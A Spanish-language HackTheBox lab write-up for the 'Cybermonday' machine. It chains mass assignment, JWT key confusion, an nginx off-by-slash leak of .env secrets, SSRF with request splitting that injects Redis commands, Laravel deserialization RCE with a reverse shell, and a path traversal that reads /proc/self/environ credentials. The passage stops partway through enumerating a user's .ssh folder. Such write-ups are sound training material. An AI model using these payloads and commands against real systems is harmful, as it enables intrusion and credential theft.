---
title: "Máquina Cybermonday"
description: "Resolución de la máquina Cybermonday de HackTheBox"
categories: ["HackTheBox", "Hard", "Linux"]
tags: ["Mass Assignment", "JWKS secret confusion", "nginx", "Request Splitting", "Deserialization", "Pivot", "Docker registry", "Code Analysis", "Path traversal", "docker-compose"]
logo: "/assets/writeups/cybermonday/logo.png"
---

Encontraremos un sitio web de ventas con una vulnerabilidad de asignación de masa y "off by slash" que nos permitirá darnos administrador y descubrir una sección de webhooks que es vulnerable a confusión del secret del JWT mediante JWKS, luego nos aprovecharemos de esto para obtener privilegios administrativos y efectuar un HTTP Request Splitting con el cual enviaremos comandos a un Redis para asignarnos una variable de sesión con un objeto PHP malicioso serializado. Estaremos en un entorno Docker por el cual descubriremos un docker registry expuesto en la subred que contiene la imagen de la parte de webhooks de la página junto a su código, al ver dicho código podremos hallar una vulnerabilidad de path traversal no muy difícil abusar que nos permitirá obtener las credenciales de un usuario del sistema.

Finalmente escalaremos privilegios abusando de un privilegio sudoers que nos permite ejecutar como root un script de Python que procesa y monta archivos de configuración de docker-compose con ciertas sanitizaciones que no son suficientes.

## Reconocimiento

La máquina solo tiene 2 puertos abiertos

```bash
# Nmap 7.94 scan initiated Mon Aug 21 11:56:47 2023 as: nmap -sS -Pn -n -vvv -p- --open -oN ports --min-rate 500 10.129.100.146
Nmap scan report for 10.129.100.146
Host is up, received user-set (0.63s latency).
Scanned at 2023-08-21 11:56:47 -04 for 188s
Not shown: 55110 closed tcp ports (reset), 10423 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Aug 21 11:59:55 2023 -- 1 IP address (1 host up) scanned in 188.32 seconds
```

El sitio web parece de ventas, específicamente para el "cibermartes"

![web](/assets/writeups/cybermonday/1.png)

Podemos registrarnos, modificar/ver nuestro perfil y hacer compras en el sitio, pero del resto no parece haber otra cosa interactiva, por lo que vamos a tener que ver que hacer en el sito analizando el comportamiento.

## Intrusión

### API admin

Hay una parte del sitio que no parece funcionar si accedemos a ella como usuario anónimo...

![Laravel when](/assets/writeups/cybermonday/2.png)

Esto además de decirnos que el sitio a pesar de estar en producción, tiene el debugging de Laravel activado nos permite ver una parte del código donde ocurre el fallo:

```php
... [snip]
 public function handle(Request $request, Closure $next)

    {

        if(auth()->user()->isAdmin)

        {

            return $next($request);

        }else{

            return back();

        }

    }
... [snip]
```

Nos revela una propiedad del objeto usuario llamada `isAdmin` que busca cuando accedemos al sitio, pero nuestro usuario es nulo siendo anónimos y por ende se muestra el error. Recordando la parte del sitio donde podíamos actualizar nuestros ajustes de perfil podemos intentar ver si el sitio tiene una vulnerabilidad de asignación en masa incrustrando la propiedad que descubrimos en la petición:

```bash
POST /home/update HTTP/1.1
Host: cybermonday.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://cybermonday.htb
DNT: 1
Connection: close
Referer: http://cybermonday.htb/home/profile

_token=WkmHeWE4tHdKmId6KLb0AWynuImO1EMZLANDrNq3&username=uwu&email=uwu%40test.com&password=&password_confirmation=&isAdmin=
```

No conocemos si es booleano o númerico, pero dado a que el Laravel está en debugging simplemente podemos probar y ver el error en caso de ser el tipo de dato incorrecto, al dar con el nos haremos administradores del sitio y tendremos acceso a una nueva parte

![Dashboard](/assets/writeups/cybermonday/3.png)

Podemos subir productos nuevos pero no nos da la posibilidad de nada, sin embargo en el changelog del sitio si vemos algo curioso:

```md
### [Unreleased]
 ## Added

    Added Home Page
    Added [Webhook](http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77) (beta) for create registration logs

 ## Fixed

    Fixed SQLi in Login Page

```

Es una nueva ruta del sitio que parece ser una API REST para webhooks

```bash
 curl -s http://webhooks-api-beta.cybermonday.htb | jq
{
  "status": "success",
  "message": {
    "routes": {
      "/auth/register": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/auth/login": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/webhooks": {
        "method": "GET"
      },
      "/webhooks/create": {
        "method": "POST",
        "params": [
          "name",
          "description",
          "action"
        ]
      },
      "/webhooks/delete:uuid": {
        "method": "DELETE"
      },
      "/webhooks/:uuid": {
        "method": "POST",
        "actions": {
          "sendRequest": {
            "params": [
              "url",
              "method"
            ]
          },
          "createLogFile": {
            "params": [
              "log_name",
              "log_content"
            ]
          }
        }
      }
    }
  }
}
```

Si nos registramos y autenticamos, obtendremos un JWT para interactuar con la API sin embargo, no podremos hacer mucho ya que ni siquiera podemos crear webhooks... pero analizando el JWT nos percataremos de algo:

```bash
Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "RS256"

Token payload values:
[+] id = 4
[+] username = "uwu"
[+] role = "user"

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

Usa llaves RSA para verificar la autenticidad y los roles se asignan en el token, por lo que si usa esto tal vez exista un archivo en el servidor que tenga la llave pública u otro tipo de información del estilo, el archivo en el que se suele almacenar información acerca de este tipo de token es `jwks.json`, y podemos encontrarlo en la raíz del servidor

```json
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "alg": "RS256",
      "n": "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w",
      "e": "AQAB"
    }
  ]
}
```

¿Y esto para qué sirve?, pues existe una vulnerabilidad que podriamos probar: se puede "confundir" a la implementación de JWT cambiando el tipo de algoritmo a HS256 para que piense que el secret es la llave pública RSA que vemos arriba. Suena un poco loco pero ya hasta tiene un CVE asignado.

Jugando con `jwt-tool` para editar el token y abusar de la vulnerabilidad editando el parámetro `role` de `user` a `admin` funciona; ahora podemos crear webhooks sin restricciones:

```bash
... [snip]
File loaded: /home/vzon/Documentos/targets/cybermonday/assets/public_key
jwttool_2601a64ff453159221ba5d682c236566 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ1d3UiLCJyb2xlIjoiYWRtaW4ifQ.CQBMq3a0ZzihxXD0Z-_5CF-witKRQGkoGko0wAgu9Rc

❯ curl -H "X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ1d3UiLCJyb2xlIjoiYWRtaW4ifQ.CQBMq3a0ZzihxXD0Z-_5CF-witKRQGkoGko0wAgu9Rc" -v http://webhooks-api-beta.cybermonday.htb/webhooks
... [snip]
< HTTP/1.1 200 OK
< Server: nginx/1.25.1
< Date: Thu, 14 Dec 2023 20:07:06 GMT
< Content-Type: application/json; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Host: webhooks-api-beta.cybermonday.htb
< X-Powered-By: PHP/8.2.7
< Set-Cookie: PHPSESSID=74a05471a8bbb7ab4ca48b38739f0543; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host webhooks-api-beta.cybermonday.htb left intact
{"status":"success","message":[{"id":1,"uuid":"fda96d32-e8c8-4301-8fb3-c821a316cf77","name":"tests","description":"webhook for tests","action":"createLogFile"}]}
```

### www-data - 172.18.0.2

El webhook de crear logs aunque parezca interesante no nos permitirá hacer nada ya que tiene buenas restricciones y solo nos permite crear un archivo, pero el de enviar peticiones nos permite enviar peticiones HTTP con métodos personalizados:

```bash
❯ curl -H "X-Access-Token: $token" -d "{\"name\":\"uwuowo\",\"description\":\"idk owo\",\"action\":\"sendRequest\"}" -H "Content-Type: application/json" -s http://webhooks-api-beta.cybermonday.htb/webhooks/create | jq
{
  "status": "success",
  "message": "Done! Send me a request to execute the action, as the event listener is still being developed.",
  "webhook_uuid": "f1c9d54d-38f9-49ca-a1e8-bec896b38bb2"
}
❯ curl -H "X-Access-Token: $token" -d "{\"url\":\"http://10.10.14.238:8000\",\"method\":\"GET\"}" -H "Content-Type: application/json" -s http://webhooks-api-beta.cybermonday.htb/webhooks/f1c9d54d-38f9-49ca-a1e8-bec896b38bb2 | jq
{
  "status": "success",
  "message": "URL is live",
  "response": "<!DOCTYPE HTML>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Directory listing for /</title>\n</head>\n<body>\n<h1>Directory listing for /</h1>\n<hr>\n<ul>\n<li><a href=\"assets/\">assets/</a></li>\n<li><a href=\"network/\">network/</a></li>\n<li><a href=\"notes.txt\">notes.txt</a></li>\n</ul>\n<hr>\n</body>\n</html>\n"
}
```

Al intentar SSRF nos percataremos de que esto está corriendo en una red de contenedores porque al hacerle peticiones a la `172.17.0.1` por el puerto 80 nos mostrará un redirect de nginx, pero lo más curioso es que podemos hacer cosas raras con el método de la petición:

```bash
❯ curl -H "X-Access-Token: $token" -d "{\"url\":\"http://10.10.14.238:8000\",\"method\":\"GET\r\nAnother thing\r\nyou've been splitted\"}" -H "Content-Type: application/json" -s http://webhooks-api-beta.cybermonday.htb/webhooks/f1c9d54d-38f9-49ca-a1e8-bec896b38bb2
-------------------------------------------------------
❯ nc -lvnp 8000
Listening on 0.0.0.0 8000
Connection received on 10.129.100.146 54756
GET
Another thing
you've been splitted / HTTP/1.1
Host: 10.10.14.238:8000
Accept: */*
```

No parece interesante, pero tratándose de un request splitting y un SSRF por una red de contenedores, podriamos buscar un Redis o algún otro servicio que utilize un protocolo de red por texto plano para intentar enviarle comandos y hacer cosas divertidas... la cosa es que tenemos que saber en que dirección está ese Redis y que podriamos alterar para verificar que el comando se ha ejecutado correctamente.

Lo primero que se puede pensar es la instrucción `SLAVEOF` hacia una instancia que controlemos en busca de trazas por red, sin embargo aún no sabemos que tocar del redis para obtener más control sobre el servidor. Sabiendo que la web utiliza Laravel y que este framework tiene soporte para Redis estaría bastante bien aprovecharlo pero necesitariamos el secret para encriptar y desencriptar los datos que se estén guardando... 

Pero espera, probando por cosas en la web principal parece que hay algo poco consiso:

```bash
 curl -v http://cybermonday.htb/assets..
*   Trying 10.10.11.228:80...
* Connected to cybermonday.htb (10.129.100.146) port 80
> GET /assets.. HTTP/1.1
> Host: cybermonday.htb
> User-Agent: curl/8.3.0
> Accept: */*
> 
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.25.1
< Date: Thu, 14 Dec 2023 20:33:21 GMT
< Content-Type: text/html
< Content-Length: 169
< Location: http://cybermonday.htb/assets../
< Connection: keep-alive
< 
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.25.1</center>
</body>
</html>
* Connection #0 to host cybermonday.htb left intact

```

Eso que ves no debería pasar, debería tirarte un 404 pero te lo toma como si ya hubiera un slash detrás de los dos puntos. Esto parece la típica off-by-slash de nginx y podemos confirmarlo al intentar acceder a algún directorio que debería existir en el directorio anterior al `public` de Laravel, como lo es `.env`:

```bash
❯ curl -v http://cybermonday.htb/assets../.env
*   Trying 10.10.11.228:80...
* Connected to cybermonday.htb (10.129.100.146) port 80
> GET /assets../.env HTTP/1.1
> Host: cybermonday.htb
> User-Agent: curl/8.3.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.25.1
< Date: Thu, 14 Dec 2023 20:37:32 GMT
< Content-Type: application/octet-stream
< Content-Length: 1081
< Last-Modified: Fri, 30 Jun 2023 14:35:57 GMT
< Connection: keep-alive
< ETag: "649ee84d-439"
< Accept-Ranges: bytes
< 
APP_NAME=CyberMonday
APP_ENV=local
APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=
APP_DEBUG=true
APP_URL=http://cybermonday.htb

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=db
DB_PORT=3306
DB_DATABASE=cybermonday
DB_USERNAME=root
DB_PASSWORD=root

BROADCAST_DRIVER=log
CACHE_DRIVER=file
FILESYSTEM_DISK=local
QUEUE_CONNECTION=sync
SESSION_DRIVER=redis
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=redis
REDIS_PASSWORD=
REDIS_PORT=6379
REDIS_PREFIX=laravel_session:
CACHE_PREFIX=

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"

CHANGELOG_PATH="/mnt/changelog.txt"

* Connection #0 to host cybermonday.htb left intact
REDIS_BLACKLIST=flushall,flushdb%         
```

Esto nos da todo lo que necesitamos para abusar del request splitting y hacer cosas divertidas con el Redis, como vemos tenemos el host (`redis`), el secret para desencriptar y también vemos que el driver de sesiones es Redis... ya que las sesiones son objetos serializados podemos intentar inyectar algo nuestro para ejecutar código PHP

Primero que nada, la estructura de una cookie de sesión en Laravel es esta:

```json
{"iv":"T/pjA7A03Y1Ywi4bemLc6A==","value":"GfthgLIPVzAu2v9Z872qcT2mu5G2aNcJSIVzIK3QiBHfTTpcrJXE0lu7Fnt6frY71xZPT1oW1nvzSJbEVqs98BNhi2/4Y7wvIrNfdC9sqSEsV7Oc6ARDBaCgpyBBMR3G","mac":"267a1c27625fdceb9d9fad3bc334853fc893a4337f4dc4ef73289f994e5a2986","tag":""}
```

`iv` es el vector de inicialización (Sí, AES), `value` el valor de la cookie encriptada y `mac` es el valor único que identifica al `value`. Si desencriptamos el valor tendremos esto:

```php
25c6a7ecd50b519b7758877cdc95726f29500d4c|nIlyomv2KOt9s4qwh7Qdyiba5zyqyp624f8Zv0Ws
```

Lo que está separado entre la barra son identificadores, y el último es el que identifica a la sesión en Redis, viendo el `.env` vemos que hay un valor llamado `REDIS_PREFIX`; Esto es el prefijo para las keys de las sesiones, por lo que nuestro valor a alterar al final seria `laravel_session:nIlyomv2KOt9s4qwh7Qdyiba5zyqyp624f8Zv0Ws`

Ahora debemos decirle a Redis que nos ponga un valor no válido a ver si la web principal nos muestra un error, con la instrucción `SET` podemos hacer esto asi que vamos a probar

```bash
❯ curl -H "X-Access-Token: $token" -d "{\"url\":\"http://redis:6379\",\"method\":\"\r\nSET laravel_session:nIlyomv2KOt9s4qwh7Qdyiba5zyqyp624f8Zv0Ws aeiou\r\nuwu\"}" -H "Content-Type: application/json" -s http://webhooks-api-beta.cybermonday.htb/webhooks/f1c9d54d-38f9-49ca-a1e8-bec896b38bb2 | jq
{
  "status": "error",
  "message": "URL is not live"
}
```

> Obviamente tirará un error ya que redis no devuelve ningún tipo de respuesta HTTP
{: .prompt-info }

Si vemos el sitio ahora, nos toparemos con que:

![when unserialize()](/assets/writeups/cybermonday/4.png)

Bien, ahora solamente debemos buscar algún gadget de deserialización que funcione contra este laravel, la herramienta [phpggc](https://github.com/ambionics/phpggc) puede ser bastante útil acá.

Probando con los que ofrece phpggc, el gadget sin null bytes `Laravel/RCE10` parece funcionar e incluso nos muestra la salida del comando en la parte superior de la página... xd

![www-data](/assets/writeups/cybermonday/5.png)

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.100.146 56760
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@070370e2cdc4:~/html/public$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@070370e2cdc4:~/html/public$ ^Z
[1]  + 35679 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 35679 continued  nc -lvnp 443
                                    reset xterm
www-data@070370e2cdc4:~/html/public$ export TERM=xterm-256color
www-data@070370e2cdc4:~/html/public$ source /etc/skel/.bashrc
```

### john - cybermonday.htb

Estamos en la `172.18.0.2`, subred `172.18.0.2/16`

```bash
www-data@070370e2cdc4:~/html/public$ cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/29 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.7
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/29 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.7
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
```

Docker suele utilizar el último octeto de la dirección IPv4 de forma secuencial para asignarsela a los contenedores que se crean, por lo que las direcciones IPv4 probables podriamos reducirlas al rango `172.18.0.1/24`. El problema en determinar las direcciones de los otros contenedores surge cuando vemos que el contenedor ni siquiera tiene `ping`:

```bash
www-data@070370e2cdc4:/tmp$ ping
bash: ping: command not found
www-data@070370e2cdc4:/tmp$ vim
bash: vim: command not found
www-data@070370e2cdc4:/tmp$ nano
bash: nano: command not found
```

Sin embargo, simplemente podemos subirnos un binario estatico de por ejemplo, nmap al contenedor y escanear la red

```bash
www-data@070370e2cdc4:/tmp$ ./nmap -sn -n 172.18.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-12-14 22:04 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Host is up (0.0038s latency).
Nmap scan report for 172.18.0.2
Host is up (0.0027s latency).
Nmap scan report for 172.18.0.3
Host is up (0.0023s latency).
Nmap scan report for 172.18.0.4
Host is up (0.0020s latency).
Nmap scan report for 172.18.0.5
Host is up (0.0017s latency).
Nmap scan report for 172.18.0.6
Host is up (0.0014s latency).
Nmap scan report for 172.18.0.7
Host is up (0.0010s latency).
Nmap done: 256 IP addresses (7 hosts up) scanned in 3.32 seconds
```

Siete hosts, veamos que son cada uno:

- `172.18.0.1` Es el gateway o equipo host obviamente
- `172.18.0.2` Es el contenedor que comprometimos
- `172.18.0.3` Es un registro de Docker
- `172.18.0.4` Es Redis
- `172.18.0.5` Es un MySQL
- `172.18.0.6` Es la API de Webhooks
- `172.18.0.7` Parece un contenedor vacio

Lo que llamaría notablemente la atención es el registro de Docker ya que puede contener imagenes de los contenedores que se están usando, y de hecho tiene una:

```bash
www-data@070370e2cdc4:/tmp$ curl -v http://172.18.0.3:5000/v2/_catalog
*   Trying 172.18.0.3:5000...
* Connected to 172.18.0.3 (172.18.0.3) port 5000 (#0)
> GET /v2/_catalog HTTP/1.1
> Host: 172.18.0.3:5000
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: application/json; charset=utf-8
< Docker-Distribution-Api-Version: registry/2.0
< X-Content-Type-Options: nosniff
< Date: Thu, 14 Dec 2023 22:11:09 GMT
< Content-Length: 37
< 
{"repositories":["cybermonday_api"]}
```

Probablemente sea la API de webhooks, descárgando los blobs y viendo el contenido de estos podemos confirmarlo

```bash
www-data@070370e2cdc4:/tmp/var/www/html$ ls -la
total 64
drwxr-xr-x 6 www-data www-data  4096 Jul  3 05:00 .
drwxr-xr-x 3 www-data www-data  4096 Jun 14  2023 ..
-rw-r--r-- 1 www-data www-data    10 May 29  2023 .dockerignore
drwxr-xr-x 8 www-data www-data  4096 May 28  2023 app
-rw-r--r-- 1 www-data www-data    56 May  8  2023 bootstrap.php
-rw-r--r-- 1 www-data www-data   328 May 28  2023 composer.json
-rw-r--r-- 1 www-data www-data 21602 May 28  2023 composer.lock
-rw-r--r-- 1 www-data www-data   153 Jun 30 15:26 config.php
drwxr-xr-x 2 www-data www-data  4096 May 28  2023 keys
drwxr-xr-x 2 www-data www-data  4096 May 29  2023 public
drwxr-xr-x 9 www-data www-data  4096 May 28  2023 vendor
```

y hay algo que llama la atención:

```bash
www-data@070370e2cdc4:/tmp/var/www/html$ cat config.php 
<?php

return [
    "dbhost" => getenv('DBHOST'),
    "dbname" => getenv('DBNAME'),
    "dbuser" => getenv('DBUSER'),
    "dbpass" => getenv('DBPASS')
];
```

Se utilizan las variables de entorno para cargar las credenciales de la base de datos, tomaremos esto en cuenta por si las moscas.

Del resto, en los controladores hay uno que no parece estar documentado

```php
<?php

namespace app\controllers;
use app\helpers\Api;
use app\models\Webhook;

class LogsController extends Api
{
    public function index($request)
    {
        $this->apiKeyAuth();

        $webhook = new Webhook;
        $webhook_find = $webhook->find("uuid", $request->uuid);

        if(!$webhook_find)
        {
            return $this->response(["status" => "error", "message" => "Webhook not found"], 404);
        }

        if($webhook_find->action != "createLogFile")
        {
            return $this->response(["status" => "error", "message" => "This webhook was not created to manage logs"], 400);
        }

        $actions = ["list", "read"];

        if(!isset($this->data->action) || empty($this->data->action))
        {
            return $this->response(["status" => "error", "message" => "\"action\" not defined"], 400);
        }

        if($this->data->action == "read")
        {
            if(!isset($this->data->log_name) || empty($this->data->log_name))
            {
                return $this->response(["status" => "error", "message" => "\"log_name\" not defined"], 400);
            }
        }

        if(!in_array($this->data->action, $actions))
        {
            return $this->response(["status" => "error", "message" => "invalid action"], 400);
        }

        $logPath = "/logs/{$webhook_find->name}/";

        switch($this->data->action)
        {
            case "list":
                $logs = scandir($logPath);
                array_splice($logs, 0, 1); array_splice($logs, 0, 1);

                return $this->response(["status" => "success", "message" => $logs]);
            
            case "read":
                $logName = $this->data->log_name;

                if(preg_match("/\.\.\//", $logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logName = str_replace(' ', '', $logName);

                if(stripos($logName, "log") === false)
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                if(!file_exists($logPath.$logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logContent = file_get_contents($logPath.$logName);
                


                return $this->response(["status" => "success", "message" => $logContent]);
        }
    }
}
```
{: file="app/controllers/LogsController.php"}

En los webhooks de tipo logs también tenemos la posibilidad de listar y leer archivos de logs, y a pesar de tener verificaciones de path traversal hay algo estúpido que hace esa verificación prácticamente inútil; verifica antes de eliminar los espacios.

Hay otras dos verificaciones que comprueban si hemos introducido la palabra "log" en el archivo a listar y si poseemos una API key que no es la que hemos generado anteriormente:

```bash
❯ curl -d "" -v -H "X-Access-Token: $token" http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs
... [snip]
< HTTP/1.1 403 Forbidden
< Server: nginx/1.25.1
< Date: Thu, 14 Dec 2023 22:27:30 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Host: webhooks-api-beta.cybermonday.htb
< X-Powered-By: PHP/8.2.7
< Set-Cookie: PHPSESSID=737a86049131bf155d37e0bae55df865; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host webhooks-api-beta.cybermonday.htb left intact
{"status":"error","message":"Unauthorized"}
```

Pero resulta que esa API key está hardcodeada...

```php
<?php

namespace app\helpers;
use app\helpers\Request;

abstract class Api
{
    protected $data;
    protected $user;
    private $api_key;

    public function __construct()
    {
        $method = Request::method();
        if(!isset($_SERVER['CONTENT_TYPE']) && $method != "get" || $method != "get" && $_SERVER['CONTENT_TYPE'] != "application/json")
        {
            return http_response_code(404);
        }

        header('Content-type: application/json; charset=utf-8');
        $this->data = json_decode(file_get_contents("php://input"));
    }

    public function auth()
    {
        if(!isset($_SERVER["HTTP_X_ACCESS_TOKEN"]) || empty($_SERVER["HTTP_X_ACCESS_TOKEN"]))
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }

        $token = $_SERVER["HTTP_X_ACCESS_TOKEN"];
        $decoded = decodeToken($token);
        if(!$decoded)
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    
        $this->user = $decoded;
    }

    public function apiKeyAuth()
    {
        $this->api_key = "22892e36-1770-11ee-be56-0242ac120002";

        if(!isset($_SERVER["HTTP_X_API_KEY"]) || empty($_SERVER["HTTP_X_API_KEY"]) || $_SERVER["HTTP_X_API_KEY"] != $this->api_key)
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    }

    public function admin()
    {
        $this->auth();
        
        if($this->user->role != "admin")
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    }

    public function response(array $data, $status = 200) {
        http_response_code($status);
        die(json_encode($data));
    }
}
```
{: file="app/helpers/Api.php"}

Sabiendo lo de las variables de entorno y lo demás que descubrimos, podemos simplemente apuntar al `/proc/self/environ` y obtener credenciales

```bash
❯ curl --json "{\"action\":\"read\",\"log_name\":\". . / . . / . . / . . /var/log/ . . / . . /proc/self/environ\"}" -s -H "X-API-KEY: 22892e36-1770-11ee-be56-0242ac120002" http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs | jq
{
  "status": "success",
  "message": "HOSTNAME=e1862f4e1242\u0000PHP_INI_DIR=/usr/local/etc/php\u0000HOME=/root\u0000PHP_LDFLAGS=-Wl,-O1 -pie\u0000PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\u0000DBPASS=ngFfX2L71Nu\u0000PHP_VERSION=8.2.7\u0000GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC\u0000PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\u0000PHP_ASC_URL=https://www.php.net/distributions/php-8.2.7.tar.xz.asc\u0000PHP_URL=https://www.php.net/distributions/php-8.2.7.tar.xz\u0000DBHOST=db\u0000DBUSER=dbuser\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000DBNAME=webhooks_api\u0000PHPIZE_DEPS=autoconf \t\tdpkg-dev \t\tfile \t\tg++ \t\tgcc \t\tlibc-dev \t\tmake \t\tpkg-config \t\tre2c\u0000PWD=/var/www/html\u0000PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0\u0000"
}
```

Tenemos una credencial pero ningún nombre de usuario aún ya que `dbuser` no aporta nada útil, sin embargo en el contenedor que comprometimos hay una especie de montura en `/mnt`


```bash
www-data@070370e2cdc4:/mnt$ ls -la
total 40
drwxr-xr-x 5 1000 1000 4096 Aug  3 09:51 .
drwxr-xr-x 1 root root 4096 Jul  3 05:00 ..
lrwxrwxrwx 1 root root    9 Jun  4  2023 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 May 29  2023 .bash_logout
-rw-r--r-- 1 1000 1000 3526 May 29  2023 .bashrc
drwxr-xr-x 3 1000 1000 4096 Aug  3 09:51 .local
-rw-r--r-- 1 1000 1000  807 May 29  2023 .profile
drwxr-xr-x 2 1000 1000 4096 Aug  3 09:51 .ssh
-rw-r--r-- 1 root root  701 May 29  2023 changelog.txt
drwxrwxrwx 3 root root 4096 Dec 14 22:42 logs
-rw-r----- 1 root 1000   33 Dec 14 12:29 user.txt
```

y un archivo `authorized_keys` con un nombre de usuario dentro de la carpeta `.ssh`

```bash
www-data@070370e2cdc4:/mnt$ cd .ssh
www-data@070370e2cdc4:/mnt/.ssh$ ls -la
total 12
drwxr-xr-x 2 1000 1000 4096 Aug  3 09:51 .
